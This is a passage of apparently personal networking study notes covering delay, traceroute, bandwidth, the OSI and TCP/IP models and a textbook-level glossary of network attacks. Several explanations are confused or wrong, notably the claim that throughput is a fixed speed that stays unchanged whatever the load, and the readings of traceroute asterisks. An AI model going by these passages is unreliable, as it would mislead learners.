route the packet. (I processed thepackage, tagged the package, I learned where it will go after I read it,and I directed it)?!</li><li><strong>Propagation Delay</strong>: Transmission delay experiencedduring transmission from an endpoint to an endpoint. The propagationrate depends on the physical environment of the connection (i.e. fiberoptic, twisted pair copper wire, etc.)</li></ul><blockquote><p><ahref="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/content/interactiveanimations/transmission-vs-propogation-delay/transmission-propagation-delay-ch1/index.html">Transmissionversus Propagation Delay simulation</a></p></blockquote><h2 id="caravan-analogy">Caravan analogy</h2><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Caravan-analogy-1.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Caravan-analogy-2.png" /></p><h2 id="packet-queueing-delay">Packet queueing delay</h2><p>a: average packet arrival rate - (average packet arrival rate) L:packet length (bits) - (packet size) R: link bandwidth (bit transmissionrate) - link bandwidth (bit transfer rate)</p><p>$ = : $</p><ul><li><em>La/R</em> ~ 0: avg. queueing delay small</li><li><em>La/R</em> -&gt; 1: avg. queueing delay large</li><li><em>La/R</em> &gt; 1: more “work” arriving is more than can beserviced - average delay infinite!</li></ul><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/La-R.png" alt="Dependence of average queuing delay on traffic intensity" style="zoom:80%;" /></p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/queueing-delay.png" style="zoom:67%;" /></p><h2 id="real-internet-delays-and-routes">“Real” Internet delays androutes</h2><ul><li><p>what do “real” Internet delay &amp; loss look like?</p></li><li><p><strong>traceroute</strong> program: provides delay measurementfrom source to router along end-end Internet path towards destination.For all <em>i</em>:</p><ul><li>sends three packets that will reach router i on path towardsdestination (with time-to-live field value of i)</li><li>router i will return packets to sender</li><li>sender measures time interval between transmission and reply</li></ul></li></ul><blockquote><p>tracert in Windows</p></blockquote><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/traceroute.png" /></p><p>We can draw some conclusions from these outputs:</p><ul><li>We can determine the distance to the delay times. We can see theincreasing delay, especially in continental jumps.</li><li>When we start to get three stars, we can understand that our packagewill get an answer.</li></ul><p>For more information <ahref="http://www.traceroute.org/">www.traceroute.org</a>. You can viewthe demo <a href="http://tool.chinaz.com/Tracert/">here</a>.</p><h2 id="packet-loss">Packet loss</h2><p>When the queue with limited capacity (we call it buffer) is full, theincoming packets will be lost.</p><ul><li>queue (aka buffer) preceding link in buffer has finite capacity</li><li>packet arriving to full queue dropped (aka lost)</li><li>lost packet may be retransmitted by previous node, by source endsystem, or not at all</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Packet-loss.png" /></p><p>You can access this animation that simulates packet loss <ahref="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/content/interactiveanimations/queuing-loss-applet/index.html"><strong>here</strong></a>.</p><h2 id="throughput-and-bandwith">Throughput and bandwith</h2><p>To explain the bandwidth on a highway example; The number of vehiclesthe highway can carry per unit time is called a<strong>bandwidth</strong>. When measuring the Badwith according totheir size; We use units such as kilobits per second (kbps), megabitsbits per second (Mbps), and gigabits per second(Gbps).<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[3]</span></a></sup></p><p>Let’s say you get a 100Mbps internet connection from your ISP. Aninternet connection at this speed is very satisfactory in today’sstandards for a single use. But even if other individuals living at homeor your next-door neighbor or even people in the coffee shop downstairsare not strong enough, will you be able to get the same appointment fromthis internet connection when you access your 100Mbps internet and startto access the internet from here? Or will you still be able to see100Mbps connection speed when you do an internet speed test?</p><p><strong>Of course no.</strong> In such a scenario, your internetspeed, which was 100Mbps at first, may decrease to 10Mbps or even loweras the number of users increases.</p><blockquote><p><em>So why? How does my internet connection, which is 100Mbps, fallbelow this? Wasn’t my speed 100Mbps?</em><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[Speed vs Bandwidth Explained - Arvig](https://www.youtube.com/watch?v=A_-L-kn9biw)">[4]</span></a></sup></p></blockquote><p>As I said at the beginning, this bandwidth will be enough for you ina single connection. In other words, you will enjoy the highway at aspeed of 100 km/h from the middle lane or the lane of your choice on a5-lane highway. But when other cars start to hit this road, the laneswill start to fill up slowly and you will begin to compromise thecomfortable driving experience you had in the first place. Especially ifthere is an accident, then you ate the quince! Traffic will come to thekey point, so your internet speed will drop to 1Mbps. Predict how aninternet-speed crash experience will occur when 5 people connected toyour network start downloading movies from torrent at the same time.</p><p>So the internet you buy as 100Mbps(<strong>bandwidth</strong>) isonly a value that may vary in one connection range.</p><p>Well, is there an internet connection value that I can see the samevalue regardless of what it does?</p><p>Yes, we call thorugput the internet connection value showing the samevalue unchanged. If we go through the Throughtput highway example, thenumber of vehicles supported can be expressed in instant time. This iswhy anyone who will pass in instant time on the highway will pass at thesame speed, even if there is a flood that will pass at the same speed,even if it is an earthquake, 1000 cars will pass at the same speed. Thisspeed will be somehow achieved.</p><p>So if you get an internet based on throughtput value from ISP. As Imentioned above, you will get a stable connection free of allpossibilities. In addition, throughput is measured with units such askilobits per second (kbps), megabits bits per second (Mbps), again likebandwith.</p><p>Of course, in such a case, you will naturally have a much higherbandwidht value. Because these concepts are related concepts. They arenot concepts that disappear while there is one.</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/speedtest.png"alt="speedtest" /><figcaption aria-hidden="true">speedtest</figcaption></figure><p>For this example, my internet connection values that I use in myhome. I currently have 78.8 Mbps instant usage from my 100Mbps bandwidthinternet connection from myISP.<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[5]</span></a></sup></p><h1 id="protocol-layers-and-service-models">1.5 Protocol layers andService Models</h1><blockquote><p>Layering, encapsulation, service models</p></blockquote><p>Networks are complex,with many “pieces”:</p><ul><li>hosts</li><li>routers</li><li>links of various media</li><li>applications</li><li>protocols</li><li>hardware, software</li></ul><p>Question: is there any hope of organizing structure of network?</p><blockquote><p>Why layering?</p><p>Approach to designing/discussing complex systems:</p><ul><li>explicit structure allows identification, relationship of system’spieces<ul><li>layered reference model for discussion</li></ul></li><li>modularization eases maintenance, updating of system<ul><li>change in layer’s service implementation: transparent to rest ofsystem</li><li>e.g. , change in gate procedure doesn’t affect rest of system</li></ul></li></ul></blockquote><h2 id="layers-of-osi-model">Layers of OSI Model</h2><p>The seven layers of the OSImodel<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[6]</span></a></sup>are:</p><ol type="1"><li><strong>Application layer:</strong> Data generated by and usable bysoftware applications. The main protocol used at this layer isHTTP.</li><li><strong>Presentation layer:</strong> Data is translated into a formthe application can accept. Some authorities consider HTTPS encryptionand decryption to take place at this layer.</li><li><strong>Session layer:</strong> Controls connections betweencomputers (this can also be handled at layer 4 by the TCPprotocol).</li><li><strong>Transport layer:</strong> Provides the means fortransmitting data between the two connected parties, as well ascontrolling the quality of service. The main protocols used here are TCPand UDP.</li><li><strong>Network layer:</strong> Handles the routing and sending ofdata between different networks. The most important protocols at thislayer are IP and ICMP.</li><li><strong>Data link layer:</strong> Handles communications betweendevices on the same network. If layer 3 is like the address on a pieceof mail, then layer 2 is like indicating the office number or apartmentnumber at that address. Ethernet is the protocol most used here.</li><li><strong>Physical layer:</strong> Packets are converted intoelectrical, radio, or optical pulses and transmitted as bits (thesmallest possible units of information) over wires, radio waves, orcables.</li></ol><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/computer-network-osi-model-layers.png" /></p><p>It is important to keep in mind that the OSI model is an abstractconceptualization of the processes that make the Internet work, andinterpreting and applying the model to the real-world Internet issometimes a subjective exercise.</p><p>The OSI model is useful for helping people talk about networkingequipment and protocols, determining which protocols are used by whichsoftware and hardware, and showing roughly how the Internet works. Butit is not a rigid step-by-step definition of how Internet connectionsalways function.</p><p><strong>Characteristics :</strong></p><ol type="1"><li>The OSI model has layered architecture wherein each layer offerscertain services to the layer below it and there is abstraction presentbetween layers.</li><li>Each layer passes data and information to the layer below it tillthe lowest layer where actual communication takes place.</li><li>The function of each layer varies which helps in reducing thecomplexity.</li><li>Protocols, services and interfaces form the basis of the model.Where protocols are the rules that layers have to follow whileexchanging information, services are the set of actions provided by thelayers and interfaces are the medium that layers use to communicate withother layers.</li></ol><p><strong>Advantages of OSI Model :</strong></p><ol type="1"><li>OSI model supports layered architecture and modularengineering.</li><li>Both connection-oriented and connectionless services are supportedby OSI model.</li><li>It implements abstraction between the layers such that, the changesmade by the above layer does not affect the layer below it.</li><li>It provides flexibility to adapt to new protocols with technologicaladvancements.</li><li>It reduces complexity as the services are divided into the 7layers.</li></ol><p><strong>Disadvantages of OSI Model :</strong></p><ol type="1"><li>OSI is a reference model. Thus, its practical application isrestricted.</li><li>Duplication of some services in layers is observed such as both thetransport layer and data link layer have error control mechanism.</li><li>The layers cannot work in parallel as each layer has to wait inorder to receive data from the layer above it.</li><li>The protocols in some of the layers were never fully defined such asthe presentation and session layer.</li><li>When OSI model was introduced, TCP/IP was already in place and thuschanging it would require a lot of time and money and mainly because alot of time and money had been spent on developing TCP/IP.</li></ol><h3 id="physical-layer">1. Physical Layer</h3><p>The lowest layer of the OSI reference model is the physical layer. Itis responsible for the actual physical connection between the devices.The physical layer contains information in the form of<strong>bits.</strong> It is responsible for transmitting individualbits from one node to the next. When receiving data, this layer will getthe signal received and convert it into 0s and 1s and send them to theData Link layer, which will put the frame back together.</p><p>The functions of the physical layer are :</p><ol type="1"><li><strong>Bit synchronization:</strong> The physical layer providesthe synchronization of the bits by providing a clock. This clockcontrols both sender and receiver thus providing synchronization at bitlevel.</li><li><strong>Bit rate control:</strong> The Physical layer also definesthe transmission rate i.e. the number of bits sent per second.</li><li><strong>Physical topologies:</strong> Physical layer specifies theway in which the different, devices/nodes are arranged in a networki.e. bus, star or mesh topolgy.</li><li><strong>Transmission mode:</strong> Physical layer also defines theway in which the data flows between the two connected devices. Thevarious transmission modes possible are: Simplex, half-duplex andfull-duplex.</li></ol><blockquote><p>Hub, Repeater, Modem, Cables are Physical Layer devices. NetworkLayer, Data Link Layer and Physical Layer are also known as<strong>Lower Layers</strong> or <strong>Hardware Layers</strong>.</p></blockquote><h3 id="data-link-layer-dll">2. Data Link Layer (DLL)</h3><p>The data link layer is responsible for the node to node delivery ofthe message. The main function of this layer is to make sure datatransfer is error-free from one node to another, over the physicallayer. When a packet arrives in a network, it is the responsibility ofDLL to transmit it to the Host using its MAC address. Data Link Layer isdivided into two sub layers :</p><ol type="1"><li>Logical Link Control (LLC)</li><li>Media Access Control (MAC)</li></ol><p>The packet received from Network layer is further divided into framesdepending on the frame size of NIC(Network Interface Card). DLL alsoencapsulates Sender and Receiver’s MAC address in the header.</p><p>The Receiver’s MAC address is obtained by placing an ARP(AddressResolution Protocol) request onto the wire asking “Who has that IPaddress?” and the destination host will reply with its MAC address.</p><p>The functions of the data Link layer are :</p><ol type="1"><li><strong>Framing:</strong> Framing is a function of the data linklayer. It provides a way for a sender to transmit a set of bits that aremeaningful to the receiver. This can be accomplished by attachingspecial bit patterns to the beginning and end of the frame.</li><li><strong>Physical addressing:</strong> After creating frames, Datalink layer adds physical addresses (MAC address) of sender and/orreceiver in the header of each frame.</li><li><strong>Error control:</strong> Data link layer provides themechanism of error control in which it detects and retransmits damagedor lost frames.</li><li><strong>Flow Control:</strong> The data rate must be constant onboth sides else the data may get corrupted thus , flow controlcoordinates that amount of data that can be sent before receivingacknowledgement.</li><li><strong>Access control:</strong> When a single communication channelis shared by multiple devices, MAC sub-layer of data link layer helps todetermine which device has control over the channel at a giventime.</li></ol><blockquote><p>Packet in Data Link layer is referred as <strong>Frame</strong>. DataLink layer is handled by the NIC (Network Interface Card) and devicedrivers of host machines. <em>Switch &amp; Bridge are Data Link Layerdevices.</em></p></blockquote><h3 id="network-layer">3. Network Layer</h3><p>Network layer works for the transmission of data from one host to theother located in different networks. It also takes care of packetrouting i.e. selection of the shortest path to transmit the packet, fromthe number of routes available. The sender &amp; receiver’s IP addressare placed in the header by the network layer. The functions of theNetwork layer are :</p><ol type="1"><li><strong>Routing:</strong> The network layer protocols determinewhich route is suitable from source to destination. This function ofnetwork layer is known as routing.</li><li><strong>Logical Addressing:</strong> In order to identify eachdevice on internetwork uniquely, network layer defines an addressingscheme. The sender &amp; receiver’s IP address are placed in the headerby network layer. Such an address distinguishes each device uniquely anduniversally.</li></ol><blockquote><p><em>Segment</em> in Network layer is referred as<strong>Packet</strong>. Network layer is implemented by networkingdevices such as routers.</p></blockquote><h3 id="transport-layer">4. Transport Layer</h3><p>Transport layer provides services to application layer and takesservices from network layer. The data in the transport layer is referredto as <em>Segments</em>. It is responsible for the End to End Deliveryof the complete message. The transport layer also provides theacknowledgement of the successful data transmission and re-transmits thedata if an error is found.</p><p><strong>At sender’s side:</strong></p><ul><li>Transport layer receives the formatted data from the upper layers,performs <strong>Segmentation</strong> and also implements <strong>Flow&amp; Error control</strong> to ensure proper data transmission. It alsoadds Source and Destination port number in its header and forwards thesegmented data to the Network Layer.</li><li>Note: The sender need to know the port number associated with thereceiver’s application. Generally, this destination port number isconfigured, either by default or manually. For example, when a webapplication makes a request to a web server, it typically uses portnumber 80, because this is the default port assigned to webapplications. Many applications have default port assigned.</li></ul><p><strong>At receiver’s side:</strong></p><ul><li>Transport Layer reads the port number from its header and forwardsthe Data which it has received to the respective application. It alsoperforms sequencing and reassembling of the segmented data.</li></ul><p>The functions of the transport layer are :</p><ol type="1"><li><strong>Segmentation and Reassembly:</strong> This layer accepts themessage from the (session) layer , breaks the message into smaller units. Each of the segment produced has a header associated with it. Thetransport layer at the destination station reassembles the message.</li><li><strong>Service Point Addressing:</strong> In order to deliver themessage to correct process, transport layer header includes a type ofaddress called service point address or port address. Thus by specifyingthis address, transport layer makes sure that the message is deliveredto the correct process.</li></ol><p>The services provided by the transport layer :</p><ol type="1"><li><p><strong>Connection Oriented Service:</strong> It is a three-phaseprocess which include:</p><ul><li>Connection Establishment</li><li>Data Transfer</li><li>Termination / disconnection</li></ul><p>In this type of transmission, the receiving device sends anacknowledgement, back to the source after a packet or group of packet isreceived. This type of transmission is reliable and secure.</p></li><li><p><strong>Connection less service:</strong> It is a one-phaseprocess and includes Data Transfer.<br />In this type of transmission, the receiver does not acknowledge receiptof a packet. This approach allows for much faster communication betweendevices. Connection-oriented service is more reliable thanconnectionless Service.</p></li></ol><blockquote><p>Data in the Transport Layer is called as <strong>Segments</strong>.Transport layer is operated by the Operating System. It is a part of theOS and communicates with the Application Layer by making system calls.Transport Layer is called as <strong>Heart of OSI</strong> model.</p></blockquote><h3 id="session-layer">5. Session Layer</h3><p>This layer is responsible for establishment of connection,maintenance of sessions, authentication and also ensures security. Thefunctions of the session layer are :</p><ol type="1"><li><strong>Session establishment, maintenance and termination:</strong>The layer allows the two processes to establish, use and terminate aconnection.</li><li><strong>Synchronization :</strong> This layer allows a process toadd checkpoints which are considered as synchronization points into thedata. These synchronization point help to identify the error so that thedata is re-synchronized properly, and ends of the messages are not cutprematurely and data loss is avoided.</li><li><strong>Dialog Controller :</strong> The session layer allows twosystems to start communication with each other in half-duplex orfull-duplex.</li></ol><blockquote><p>All the below 3 layers(including Session Layer) are integrated as asingle layer in the TCP/IP model as “Application Layer”. Implementationof these 3 layers is done by the network application itself. These arealso known as <strong>Upper Layers</strong> or <strong>SoftwareLayers</strong>.</p></blockquote><p>SCENARIO:</p>Let’s consider a scenario where a user wants to send a message throughsome Messenger application running in his browser. The “Messenger” hereacts as the application layer which provides the user with an interfaceto create the data. This message or so-called Data is compressed,encrypted (if any secure data) and converted into bits (0’s and 1’s) sothat it can be transmitted.<p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/computer-network-osi-model-layers-session.png" style="zoom:80%;" /></p><h3 id="presentation-layer">6. Presentation Layer</h3><p>Presentation layer is also called the <strong>Translationlayer</strong>. The data from the application layer is extracted hereand manipulated as per the required format to transmit over the network.The functions of the presentation layer are :</p><ol type="1"><li><strong>Translation :</strong> For example, ASCII to EBCDIC.</li><li><strong>Encryption/ Decryption :</strong> Data encryption translatesthe data into another form or code. The encrypted data is known as thecipher text and the decrypted data is known as plain text. A key valueis used for encrypting as well as decrypting data.</li><li><strong>Compression:</strong> Reduces the number of bits that needto be transmitted on the network.</li></ol><h3 id="application-layer">7. Application Layer</h3><p>At the very top of the OSI Reference Model stack of layers, we findApplication layer which is implemented by the network applications.These applications produce the data, which has to be transferred overthe network. This layer also serves as a window for the applicationservices to access the network and for displaying the receivedinformation to the user.</p><p>Ex: Application – Browsers, Skype Messenger etc. &gt;ApplicationLayer is also called as Desktop Layer.</p><p>The functions of the Application layer are :</p><ol type="1"><li>Network Virtual Terminal</li><li>FTAM-File transfer access and management</li><li>Mail Services</li><li>Directory Services</li></ol><p>OSI model acts as a reference model and is not implemented in theInternet because of its late invention. Current model being used is theTCP/IP model.</p><h2 id="tcpip-model">TCP/IP Model</h2><p>The <strong>OSI Model</strong> we just looked at is just areference/logical model. It was designed to describe the functions ofthe communication system by dividing the communication procedure intosmaller and simpler components. But when we talk about the TCP/IP model,it was designed and developed by Department of Defense (DoD) in 1960sand is based on standard protocols. It stands for Transmission ControlProtocol/Internet Protocol. The <strong>TCP/IP model</strong> is aconcise version of the OSI model. It contains four layers, unlike sevenlayers in the OSI model. The layers are:</p><ol type="1"><li>Process/Application Layer</li><li>Host-to-Host/Transport Layer</li><li>Internet Layer</li><li>Network Access/Link Layer</li></ol><p>The diagrammatic comparison of the TCP/IP and OSI model is as follows:</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/tcpAndOSI.png" /></p><p>Difference between TCP/IP and OSI Model:</p><table><thead><tr><th style="text-align: left;">TCP/IP</th><th style="text-align: left;">OSI</th></tr></thead><tbody><tr><td style="text-align: left;">TCP refers to Transmission ControlProtocol.</td><td style="text-align: left;">OSI refers to Open SystemsInterconnection.</td></tr><tr><td style="text-align: left;">TCP/IP has 4 layers.</td><td style="text-align: left;">OSI has 7 layers.</td></tr><tr><td style="text-align: left;">TCP/IP is more reliable</td><td style="text-align: left;">OSI is less reliable</td></tr><tr><td style="text-align: left;">TCP/IP does not have very strictboundaries.</td><td style="text-align: left;">OSI has strict boundaries</td></tr><tr><td style="text-align: left;">TCP/IP follow a horizontal approach.</td><td style="text-align: left;">OSI follows a vertical approach.</td></tr><tr><td style="text-align: left;">TCP/IP uses both session and presentationlayer in the application layer itself.</td><td style="text-align: left;">OSI uses different session andpresentation layers.</td></tr><tr><td style="text-align: left;">TCP/IP developed protocols thenmodel.</td><td style="text-align: left;">OSI developed model then protocol.</td></tr><tr><td style="text-align: left;">Transport layer in TCP/IP does not provideassurance delivery of packets.</td><td style="text-align: left;">In OSI model, transport layer providesassurance delivery of packets.</td></tr><tr><td style="text-align: left;">TCP/IP model network layer only providesconnection less services.</td><td style="text-align: left;">Connection less and connection orientedboth services are provided by network layer in OSI model.</td></tr><tr><td style="text-align: left;">Protocols cannot be replaced easily inTCP/IP model.</td><td style="text-align: left;">While in OSI model, Protocols are bettercovered and is easy to replace with the change in technology.</td></tr></tbody></table><p>The first layer is the Process layer on the behalf of the sender andNetwork Access layer on the behalf of the receiver. During this article,we will be talking on the behalf of the receiver.</p><h3 id="network-access-layer">1. Network Access Layer</h3><p>This layer corresponds to the combination of Data Link Layer andPhysical Layer of the OSI model. It looks out for hardware addressingand the protocols present in this layer allows for the physicaltransmission of data. We just talked about ARP being a protocol ofInternet layer, but there is a conflict about declaring it as a protocolof Internet Layer or Network access layer. It is described as residingin layer 3, being encapsulated by layer 2 protocols.</p><h3 id="internet-layer">2. Internet Layer</h3><p>This layer parallels the functions of OSI’s Network layer. It definesthe protocols which are responsible for logical transmission of dataover the entire network. The main protocols residing at this layer are:</p><ol type="1"><li><strong>IP</strong> stands for Internet Protocol and it isresponsible for delivering packets from the source host to thedestination host by looking at the IP addresses in the packet headers.IP has 2 versions: IPv4 and IPv6. IPv4 is the one that most of thewebsites are using currently. But IPv6 is growing as the number of IPv4addresses are limited in number when compared to the number ofusers.</li><li><strong>ICMP</strong> stands for Internet Control Message Protocol.It is encapsulated within IP datagrams and is responsible for providinghosts with information about network problems.</li><li><strong>ARP</strong> stands for Address Resolution Protocol. Its jobis to find the hardware address of a host from a known IP address. ARPhas several types: Reverse ARP, Proxy ARP, Gratuitous ARP and InverseARP.</li></ol><h3 id="host-to-host-layer">3. Host-to-Host Layer</h3><p>This layer is analogous to the transport layer of the OSI model. Itis responsible for end-to-end communication and error-free delivery ofdata. It shields the upper-layer applications from the complexities ofdata. The two main protocols present in this layer are :</p><ol type="1"><li><strong>Transmission Control Protocol (TCP)</strong> It is known toprovide reliable and error-free communication between end systems. Itperforms sequencing and segmentation of data. It also has acknowledgmentfeature and controls the flow of the data through flow controlmechanism. It is a very effective protocol but has a lot of overhead dueto such features. Increased overhead leads to increased cost.</li><li><strong>User Datagram Protocol (UDP)</strong> On the other hand doesnot provide any such features. It is the go-to protocol if yourapplication does not require reliable transport as it is verycost-effective. Unlike TCP, which is connection-oriented protocol, UDPis connectionless.</li></ol><h3 id="application-layer-1">4. Application Layer</h3><p>This layer performs the functions of top three layers of the OSImodel: Application, Presentation and Session Layer. It is responsiblefor node-to-node communication and controls user-interfacespecifications. Some of the protocols present in this layer are: HTTP,HTTPS, FTP, TFTP, Telnet, SSH, SMTP, SNMP, NTP, DNS, DHCP, NFS, XWindow, LPD. Have a look at <ahref="https://www.geeksforgeeks.org/protocols-application-layer/">Protocolsin Application Layer</a> for some information about these protocols.Protocols other than those present in the linked article are :</p><ol type="1"><li><strong>HTTP and HTTPS</strong> HTTP stands for Hypertext transferprotocol. It is used by the World Wide Web to manage communicationsbetween web browsers and servers. HTTPS stands for HTTP-Secure. It is acombination of HTTP with SSL(Secure Socket Layer). It is efficient incases where the browser need to fill out forms, sign in, authenticateand carry out bank transactions.</li><li><strong>SSH</strong> SSH stands for Secure Shell. It is a terminalemulations software similar to Telnet. The reason SSH is more preferredis because of its ability to maintain the encrypted connection. It setsup a secure session over a TCP/IP connection.</li><li><strong>NTP</strong> NTP stands for Network Time Protocol. It isused to synchronize the clocks on our computer to one standard timesource. It is very useful in situations like bank transactions. Assumethe following situation without the presence of NTP. Suppose you carryout a transaction, where your computer reads the time at 2:30 PM whilethe server records it at 2:28 PM. The server can crash very badly ifit’s out of sync.</li></ol><h2 id="hybrid-model"><strong>Hybrid model</strong></h2><blockquote><p>Layered Internet protocol stack</p></blockquote><p>In the real world, we use a mix of both the OSI model and the TCP/IPmodel, called the Hybrid model. In the Hybrid model, the Applicationlayer is a combination of layer 7, layer 6 and layer 5 of OSI model(similar to TCP/IP model). The remaining layers (layer 1, 2, 3 and 4)are the same as the OSI model.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Hybrid-model.jpg" style="zoom: 50%;" /></p><p><strong>application</strong>: supporting network applications</p><ul><li>HTTP, IMAP, SMTP, DNS</li></ul><p><strong>transport</strong>: process-process data transfer</p><ul><li>TCP, UDP</li></ul><p><strong>network</strong>: routing of datagrams from source todestination</p><ul><li>IP, routing protocols</li></ul><p><strong>link</strong>: data transfer between neighboring networkelements</p><ul><li>Ethernet, 802.11 (Wi-Fi), PPP</li></ul><p><strong>physical</strong>: bits “on the wire”</p><h2 id="services-layering-and-encapsulation">Services, Layering andEncapsulation</h2><p>Watch the <ahref="http://gaia.cs.umass.edu/kurose_ross/videos/1/5/1.5_video_slides_posted.pptx">courseware</a>and <a href="https://youtu.be/IZ_PnVXtMeY">instructional videos</a> formore details.</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Encapsulation-end-end-view.png" /></p><h1 id="basic-network-attacks-in-computer-network">1.6 Basic NetworkAttacks in Computer Network</h1><blockquote><p>Networks Under Attack</p></blockquote><p>Many people rely on the Internet for many of their professional,social and personal activities. But there are also people who attempt todamage our Internet-connected computers, violate our privacy and renderinoperable the Internet services.</p><p>Given the frequency and variety of existing attacks as well as thethreat of new and more destructive future attacks, network security hasbecome a central topic in the field of computer networking.</p><p><strong>How are computer networks vulnerable? What are some of themore prevalent types of attacks today?</strong></p><p><strong>Malware</strong> – short for malicious software which isspecifically designed to disrupt, damage, or gain authorized access to acomputer system. Much of the malware out there today isself-replicating: once it infects one host, from that host it seeksentry into other hosts over the Internet, and from the newly infectedhosts, it seeks entry into yet more hosts. In this manner,self-replicating malware can spread exponentially fast.</p><p><strong>Virus</strong> – A malware which requires some form of user’sinteraction to infect the user’s device. The classic example is ane-mail attachment containing malicious executable code. If a userreceives and opens such an attachment, the user inadvertently runs themalware on the device.</p><p><strong>Worm</strong> – A malware which can enter a device withoutany explicit user interaction. For example, a user may be running avulnerable network application to which an attacker can send malware. Insome cases, without any user intervention, the application may acceptthe malware from the Internet and run it, creating a worm.</p><p><strong>Botnet</strong> – A network of private computers infectedwith malicious software and controlled as a group without the owners’knowledge, e.g. to send spam.</p><p><strong>DoS (Denial of Service)</strong> – A DoS attack renders anetwork, host, or other pieces of infrastructure unusable by legitimateusers. Most Internet DoS attacks fall into one of three categories :</p><p>• <em>Vulnerability attack</em>: This involves sending a fewwell-crafted messages to a vulnerable application or operating systemrunning on a targeted host. If the right sequence of packets is sent toa vulnerable application or operating system, the service can stop or,worse, the host can crash.</p><p>• <em>Bandwidth flooding</em>: The attacker sends a deluge of packetsto the targeted host—so many packets that the target’s access linkbecomes clogged, preventing legitimate packets from reaching theserver.</p><p>• <em>Connection flooding</em>: The attacker establishes a largenumber of half-open or fully open TCP connections at the target host.The host can become so bogged down with these bogus connections that itstops accepting legitimate connections.</p><p><strong>DDoS (Distributed DoS)</strong> – DDoS is a type of DOSattack where multiple compromised systems, are used to target a singlesystem causing a Denial of Service (DoS) attack. DDoS attacks leveragingbotnets with thousands of comprised hosts are a common occurrence today.DDoS attacks are much harder to detect and defend against than a DoSattack from a single host.</p><p><strong>Packet sniffer</strong> – A passive receiver that records acopy of every packet that flies by is called a packet sniffer. Byplacing a passive receiver in the vicinity of the wireless transmitter,that receiver can obtain a copy of every packet that is transmitted!These packets can contain all kinds of sensitive information, includingpasswords, social security numbers, trade secrets, and private personalmessages. some of the best defenses against packet sniffing involvecryptography.</p><p><strong>IP Spoofing</strong> – The ability to inject packets into theInternet with a false source address is known as IP spoofing, and is butone of many ways in which one user can masquerade as another user. Tosolve this problem, we will need end-point authentication, that is, amechanism that will allow us to determine with certainty if a messageoriginates from where we think it does.</p><p><strong>Man-in-the-Middle Attack</strong> – As the name indicates, aman-in-the-middle attack occurs when someone between you and the personwith whom you are communicating is actively monitoring, capturing, andcontrolling your communication transparently. For example, the attackercan re-route a data exchange. When computers are communicating at lowlevels of the network layer, the computers might not be able todetermine with whom they are exchanging data.</p><p><strong>Compromised-Key Attack</strong> – A key is a secret code ornumber necessary to interpret secured information. Although obtaining akey is a difficult and resource-intensive process for an attacker, it ispossible. After an attacker obtains a key, that key is referred to as acompromised key. An attacker uses the compromised key to gain access toa secured communication without the sender or receiver being aware ofthe attack.</p><p><strong>Phishing</strong> – The fraudulent practice of sending emailspurporting to be from reputable companies in order to induce individualsto reveal personal information, such as passwords and credit cardnumbers.</p><p><strong>DNS spoofing</strong> – Also referred to as DNS cachepoisoning, is a form of computer security hacking in which corruptDomain Name System data is introduced into the DNS resolver’s cache,causing the name server to return an incorrect IP address.</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/defense.png"alt="network defense" /><figcaption aria-hidden="true">network defense</figcaption></figure><hr /><p>再也不用英文做笔记了。。。。。复习发现根本看不懂</p><h1 id="reference">Reference</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="http://gaia.cs.umass.edu/kurose_ross/index.html"class="uri">http://gaia.cs.umass.edu/kurose_ross/index.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span><a href="https://www.whoismyisp.org/articles/what-is-an-isp"class="uri">https://www.whoismyisp.org/articles/what-is-an-isp</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><ahref="https://www.differencebetween.com/difference-between-throughput-and-vs-bandwidth/"class="uri">https://www.differencebetween.com/difference-between-throughput-and-vs-bandwidth/</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:4"class="footnote-text"><span><a href="https://www.youtube.com/watch?v=A_-L-kn9biw">Speedvs Bandwidth Explained - Arvig</a><a href="#fnref:4" rev="footnote" 